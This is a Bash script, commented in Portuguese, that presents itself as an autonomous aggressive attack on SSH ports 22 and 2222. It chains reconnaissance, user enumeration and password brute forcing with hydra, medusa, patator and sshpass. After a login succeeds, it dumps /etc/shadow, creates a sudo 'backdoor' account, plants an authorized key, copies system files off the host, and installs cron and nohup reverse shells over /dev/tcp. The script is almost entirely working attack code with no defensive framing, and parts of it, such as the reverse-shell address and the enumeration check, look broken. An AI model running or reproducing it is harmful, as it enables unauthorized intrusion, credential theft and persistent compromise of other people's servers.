#!/bin/bash

################################################################################
# SCRIPT DE ATAQUE AUTÔNOMO - SSH (Portas 22 e 2222)
# Descrição: Ataque agressivo contra SSH
################################################################################

# Solicitar target e IP do usuário
if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Uso: $0 <DOMINIO> <IP>"
    echo "Exemplo: $0 exemplo.com.br 192.168.1.100"
    exit 1
fi

TARGET="$1"
IP="$2"
PORTS=("22" "2222")
LOG_DIR="./logs_ssh"
WORDLIST="/usr/share/wordlists/rockyou.txt"
RESULTS_FILE="$LOG_DIR/ssh_results.txt"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[+] Iniciando ataque autônomo contra SSH${NC}"
echo -e "${GREEN}[+] Target: $TARGET (Portas: ${PORTS[@]})${NC}"

mkdir -p $LOG_DIR

# Verificar e instalar ferramentas
check_and_install() {
    local tool=$1
    local install_cmd=$2
    
    if ! command -v $tool &> /dev/null; then
        echo -e "${YELLOW}[!] $tool não encontrado. Instalando...${NC}"
        eval $install_cmd
    fi
}

echo -e "${YELLOW}[*] Verificando ferramentas...${NC}"
check_and_install "nmap" "sudo apt-get update && sudo apt-get install -y nmap"
check_and_install "hydra" "sudo apt-get install -y hydra"
check_and_install "medusa" "sudo apt-get install -y medusa"
check_and_install "patator" "sudo apt-get install -y patator || pip3 install patator"
check_and_install "ssh" "sudo apt-get install -y openssh-client"
check_and_install "ncat" "sudo apt-get install -y ncat"

# Criar wordlist básica se não existir
if [ ! -f "$WORDLIST" ]; then
    echo -e "${YELLOW}[!] Criando wordlist básica...${NC}"
    cat > /tmp/ssh_wordlist.txt << EOF
root
admin
password
123456
admin123
root123
toor
pass
12345
1234
qwerty
password123
root@123
admin@123
EOF
    WORDLIST="/tmp/ssh_wordlist.txt"
fi

# Lista de usuários comuns
USERS=("root" "admin" "administrator" "user" "test" "guest" "ubuntu" "debian" "centos" "www-data" "apache" "nginx")

# FASE 1: RECONHECIMENTO
echo -e "${YELLOW}[*] FASE 1: Reconhecimento SSH${NC}"
echo "=================================="

for PORT in "${PORTS[@]}"; do
    echo -e "${YELLOW}[*] Analisando porta $PORT...${NC}"
    
    # Banner grabbing
    echo -e "${YELLOW}[*] Banner grabbing...${NC}"
    timeout 5 bash -c "echo 'SSH-2.0-Test' | nc $IP $PORT" 2>&1 | tee -a $LOG_DIR/banner_$PORT.txt
    
    # Nmap SSH scripts
    echo -e "${YELLOW}[*] Executando scripts Nmap...${NC}"
    nmap -p $PORT --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos,sshv1 $IP > $LOG_DIR/nmap_ssh_$PORT.txt 2>&1
    cat $LOG_DIR/nmap_ssh_$PORT.txt
    
    # Verificar se SSH está acessível
    timeout 5 bash -c "echo > /dev/tcp/$IP/$PORT" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] SSH está acessível na porta $PORT${NC}"
    else
        echo -e "${RED}[-] SSH não está acessível na porta $PORT${NC}"
        continue
    fi
done

# FASE 2: ENUMERAÇÃO DE USUÁRIOS
echo -e "${YELLOW}[*] FASE 2: Enumeração de Usuários${NC}"
echo "=================================="

echo -e "${YELLOW}[*] Tentando enumerar usuários válidos...${NC}"

for PORT in "${PORTS[@]}"; do
    for user in "${USERS[@]}"; do
        echo -e "${YELLOW}[*] Testando usuário: $user na porta $PORT${NC}"
        # Tentar conexão sem senha para verificar se usuário existe
        ssh -o ConnectTimeout=3 -o PreferredAuthentications=password -o PubkeyAuthentication=no $user@$IP -p $PORT "exit" 2>&1 | tee -a $LOG_DIR/user_enum_$PORT.txt
        
        # Verificar mensagens específicas
        if grep -q "Permission denied" $LOG_DIR/user_enum_$PORT.txt; then
            echo -e "${GREEN}[+] Usuário $user pode existir (Permission denied)${NC}" | tee -a $RESULTS_FILE
        fi
    done
done

# FASE 3: BRUTE FORCE AGRESSIVO
echo -e "${YELLOW}[*] FASE 3: Brute Force Agressivo${NC}"
echo "=================================="

for PORT in "${PORTS[@]}"; do
    echo -e "${YELLOW}[*] Atacando porta $PORT...${NC}"
    
    # Hydra
    echo -e "${YELLOW}[*] Executando Hydra...${NC}"
    hydra -L <(printf '%s\n' "${USERS[@]}") -P $WORDLIST -t 16 -W 1 -f -s $PORT ssh://$IP 2>&1 | tee $LOG_DIR/hydra_$PORT.txt
    
    # Medusa
    echo -e "${YELLOW}[*] Executando Medusa...${NC}"
    medusa -h $IP -u root -P $WORDLIST -M ssh -n $PORT -t 10 -f 2>&1 | tee $LOG_DIR/medusa_$PORT.txt
    
    # Patator (mais agressivo)
    if command -v patator &> /dev/null; then
        echo -e "${YELLOW}[*] Executando Patator...${NC}"
        patator ssh_login host=$IP port=$PORT user=FILE0 password=FILE1 0=/tmp/users.txt 1=$WORDLIST -x ignore:mesg='Authentication failed.' 2>&1 | tee $LOG_DIR/patator_$PORT.txt
    fi
    
    # Tentar senhas comuns primeiro
    echo -e "${YELLOW}[*] Testando senhas comuns...${NC}"
    COMMON_PASSWORDS=("root" "admin" "password" "123456" "toor" "pass" "")
    
    for user in "${USERS[@]}"; do
        for pass in "${COMMON_PASSWORDS[@]}"; do
            echo -e "${YELLOW}[*] Testando $user:$pass na porta $PORT${NC}"
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o PreferredAuthentications=password -o PubkeyAuthentication=no $user@$IP -p $PORT "id" 2>&1 | grep -v "Permission denied" && {
                echo -e "${GREEN}[+] SUCESSO! $user:$pass na porta $PORT${NC}" | tee -a $RESULTS_FILE
                echo "$user:$pass:$PORT" >> $LOG_DIR/credentials.txt
            }
        done
    done
done

# FASE 4: EXPLORAÇÃO DE VULNERABILIDADES
echo -e "${YELLOW}[*] FASE 4: Exploração de Vulnerabilidades${NC}"
echo "=================================="

echo -e "${YELLOW}[*] OpenSSH 7.4 possui vulnerabilidades conhecidas...${NC}"

# Verificar se temos credenciais
if [ -f "$LOG_DIR/credentials.txt" ] && [ -s "$LOG_DIR/credentials.txt" ]; then
    echo -e "${GREEN}[+] Credenciais encontradas!${NC}"
    
    while IFS=: read -r user pass port; do
        echo -e "${GREEN}[+] Conectando com $user:$pass na porta $port${NC}"
        
        # Conectar e executar comandos
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@$IP -p $port << EOF 2>&1 | tee $LOG_DIR/exploit_$user.txt
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow 2>/dev/null || echo "Sem acesso ao shadow"
cat /etc/hosts
ps aux
netstat -tulpn
ls -la /home
ls -la /root 2>/dev/null || echo "Sem acesso ao /root"
find / -name "*.txt" -o -name "*.conf" -o -name "*.log" 2>/dev/null | head -20
EOF
        
        # Tentar escalar privilégios
        echo -e "${YELLOW}[*] Tentando escalar privilégios...${NC}"
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@$IP -p $port "sudo -l" 2>&1 | tee -a $LOG_DIR/exploit_$user.txt
        
        # Verificar se pode executar comandos como root
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@$IP -p $port "sudo su -c 'id'" 2>&1 | tee -a $LOG_DIR/exploit_$user.txt
        
        # Criar backdoor
        echo -e "${YELLOW}[*] Criando backdoor SSH...${NC}"
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@$IP -p $port << EOF 2>&1 | tee -a $LOG_DIR/backdoor_$user.txt
echo "$pass" | sudo -S useradd -m -s /bin/bash backdoor 2>/dev/null
echo "$pass" | sudo -S usermod -aG sudo backdoor 2>/dev/null
echo "backdoor:backdoor123" | sudo -S chpasswd 2>/dev/null
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." >> ~/.ssh/authorized_keys 2>/dev/null
EOF
        
        # Baixar arquivos sensíveis
        echo -e "${YELLOW}[*] Baixando arquivos sensíveis...${NC}"
        sshpass -p "$pass" scp -o StrictHostKeyChecking=no -P $port $user@$IP:/etc/passwd $LOG_DIR/passwd_$user.txt 2>/dev/null
        sshpass -p "$pass" scp -o StrictHostKeyChecking=no -P $port $user@$IP:/etc/hosts $LOG_DIR/hosts_$user.txt 2>/dev/null
        
    done < $LOG_DIR/credentials.txt
else
    echo -e "${YELLOW}[!] Nenhuma credencial encontrada${NC}"
fi

# FASE 5: EXPLOITS ESPECÍFICOS DO OPENSSH 7.4
echo -e "${YELLOW}[*] FASE 5: Exploits Específicos${NC}"
echo "=================================="

# Verificar vulnerabilidades conhecidas do OpenSSH 7.4
echo -e "${YELLOW}[*] Verificando CVE conhecidos do OpenSSH 7.4...${NC}"

# CVE-2018-15473 - Username enumeration
echo -e "${YELLOW}[*] Testando CVE-2018-15473 (Username enumeration)...${NC}"
python3 << EOF 2>&1 | tee $LOG_DIR/cve_2018_15473.txt
import socket
import sys

def check_user(ip, port, username):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        
        # SSH handshake
        sock.recv(1024)
        sock.send(b'SSH-2.0-OpenSSH_7.4\r\n')
        sock.recv(1024)
        
        # Try to authenticate
        message = b'\x00\x00\x00\x0c' + username.encode() + b'\x00\x00\x00\x00'
        sock.send(message)
        response = sock.recv(1024)
        
        sock.close()
        
        # Check response
        if b'invalid user' in response.lower() or b'permission denied' in response.lower():
            return True
        return False
    except:
        return False

for user in ['root', 'admin', 'test', 'nonexistent']:
    result = check_user('$IP', 22, user)
    print(f"User {user}: {'EXISTS' if result else 'NOT FOUND'}")
EOF

# FASE 6: PÓS-EXPLORAÇÃO
echo -e "${YELLOW}[*] FASE 6: Pós-Exploração${NC}"
echo "=================================="

if [ -f "$LOG_DIR/credentials.txt" ] && [ -s "$LOG_DIR/credentials.txt" ]; then
    echo -e "${GREEN}[+] Iniciando pós-exploração...${NC}"
    
    while IFS=: read -r user pass port; do
        echo -e "${YELLOW}[*] Pós-exploração para $user@$IP:$port${NC}"
        
        # Coletar informações do sistema
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@$IP -p $port << 'ENDOFSCRIPT' 2>&1 | tee $LOG_DIR/post_exploit_$user.txt
echo "=== SYSTEM INFO ==="
uname -a
cat /etc/os-release
cat /proc/version

echo "=== NETWORK INFO ==="
ifconfig
ip addr
netstat -tulpn
ss -tulpn

echo "=== USER INFO ==="
whoami
id
who
w
last

echo "=== PROCESSES ==="
ps aux | head -20
top -bn1 | head -20

echo "=== FILESYSTEM ==="
df -h
mount

echo "=== CRON JOBS ==="
crontab -l 2>/dev/null
ls -la /etc/cron* 2>/dev/null

echo "=== SUID BINARIES ==="
find / -perm -4000 -type f 2>/dev/null | head -20

echo "=== SENSITIVE FILES ==="
find /home -name "*.txt" -o -name "*.conf" -o -name "*.log" 2>/dev/null | head -20
ENDOFSCRIPT
        
        # Tentar estabelecer persistência
        echo -e "${YELLOW}[*] Estabelecendo persistência...${NC}"
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@$IP -p $port << EOF 2>&1 | tee -a $LOG_DIR/persistence_$user.txt
# Adicionar ao crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -i >& /dev/tcp/$IP/4444 0>&1") | crontab -

# Criar script de backdoor
echo '#!/bin/bash' > /tmp/.backdoor.sh
echo 'while true; do' >> /tmp/.backdoor.sh
echo '  bash -i >& /dev/tcp/$IP/4444 0>&1 2>/dev/null' >> /tmp/.backdoor.sh
echo '  sleep 60' >> /tmp/.backdoor.sh
echo 'done' >> /tmp/.backdoor.sh
chmod +x /tmp/.backdoor.sh
nohup /tmp/.backdoor.sh > /dev/null 2>&1 &
EOF
        
    done < $LOG_DIR/credentials.txt
fi

# RESUMO
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}[+] ATAQUE SSH CONCLUÍDO${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}[*] Logs salvos em: $LOG_DIR${NC}"
echo -e "${YELLOW}[*] Resultados em: $RESULTS_FILE${NC}"
echo ""
ls -lah $LOG_DIR/

